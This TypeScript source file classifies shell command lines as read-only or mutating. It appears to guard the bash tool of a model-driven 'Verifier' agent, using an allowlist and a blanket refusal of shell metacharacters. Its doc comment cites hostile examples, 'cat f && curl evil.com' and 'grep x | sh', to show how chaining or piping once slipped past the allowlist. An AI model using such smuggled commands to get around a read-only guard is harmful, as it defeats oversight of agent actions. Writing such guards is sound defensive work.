export interface CommandClassification {
  isReadOnly: boolean;
  commandName: string;
  reason?: string;
}

const READ_ONLY_COMMANDS = new Set([
  'ls',
  'dir',
  'cat',
  'grep',
  'rg',
  'find',
  'head',
  'tail',
  'wc',
  'diff',
  'pwd',
  'echo',
  'which',
  'whoami',
]);

/**
 * Read-only subcommands, keyed by the leading command.
 *
 * Values may be multi-word (`run test`). They are matched against the joined
 * tokens that follow the command, longest first, so `npm run test` resolves
 * rather than being compared against the single token `run`.
 */
const READ_ONLY_SUBCOMMANDS: Record<string, Set<string>> = {
  git: new Set(['status', 'log', 'diff', 'show', 'branch', 'rev-parse']),
  cargo: new Set(['check', 'test']),
  npm: new Set(['test', 'run test', 'run typecheck', 'run lint']),
};

/**
 * Characters that let one command line become several, or reach the filesystem
 * without naming a mutating command.
 *
 * Splitting on whitespace and inspecting the first token describes a single
 * command, and a shell line is not necessarily a single command. `cat f &&
 * curl evil.com` and `grep x | sh` both lead with an allowlisted read-only
 * name, and both previously classified as read-only — the allowlist was
 * answering a question about `cat` while the shell ran something else. The same
 * hole covers redirects (`>` writes), command substitution (`$(…)`, backticks)
 * and newlines.
 *
 * This is the Verifier's only bash guard and its input is chosen by a model, so
 * the check refuses to classify anything it cannot read as one command rather
 * than classifying it optimistically.
 */
const SHELL_METACHARACTERS = /[;&|`$(){}<>\n\r]/;

export function classifyCommand(fullCommandLine: string): CommandClassification {
  const trimmed = fullCommandLine.trim();
  if (!trimmed) {
    return { isReadOnly: true, commandName: '' };
  }

  // Checked before tokenizing: the question "which command is this?" has no
  // answer for a line that is more than one command.
  //
  // A quoted metacharacter (`grep "a;b" f`) is refused too. Distinguishing it
  // would mean implementing shell quoting rules, and being wrong in that
  // direction lets a command through; being wrong in this direction only
  // rejects a command the student can rephrase.
  const metaMatch = SHELL_METACHARACTERS.exec(trimmed);
  if (metaMatch) {
    return {
      isReadOnly: false,
      commandName: pathBasename(trimmed.split(/\s+/)[0]),
      reason: `Command contains the shell metacharacter "${metaMatch[0]}", so it is more than one command and cannot be classified as read-only.`,
    };
  }

  const tokens = trimmed.split(/\s+/);
  const mainCmd = pathBasename(tokens[0]);

  if (READ_ONLY_COMMANDS.has(mainCmd)) {
    return { isReadOnly: true, commandName: mainCmd };
  }

  const subcommands = READ_ONLY_SUBCOMMANDS[mainCmd];
  if (subcommands && tokens.length > 1) {
    // Longest first, so `run test` is preferred over any single-token entry.
    for (let take = Math.min(tokens.length - 1, 3); take >= 1; take--) {
      const sub = tokens.slice(1, 1 + take).join(' ');
      if (subcommands.has(sub)) {
        return { isReadOnly: true, commandName: `${mainCmd} ${sub}` };
      }
    }
  }

  // Framework test runners
  if (['vitest', 'jest', 'pytest'].includes(mainCmd)) {
    return { isReadOnly: true, commandName: mainCmd };
  }

  return {
    isReadOnly: false,
    commandName: mainCmd,
    reason: `Command "${mainCmd}" is classified as mutating / potentially modifying.`,
  };
}

function pathBasename(p: string): string {
  const parts = p.split(/[/\\]/);
  return parts[parts.length - 1].toLowerCase();
}
